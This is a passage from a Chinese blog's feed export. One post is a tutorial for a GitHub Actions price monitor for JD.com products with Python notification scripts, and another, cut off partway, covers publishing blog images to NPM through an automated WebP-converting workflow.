target=\"_blank\">斗罗大陆为何不是2d的？</a><br>\n","link":"http://www.zhihu.com/question/462786180/answer/1936987479?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 18:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span 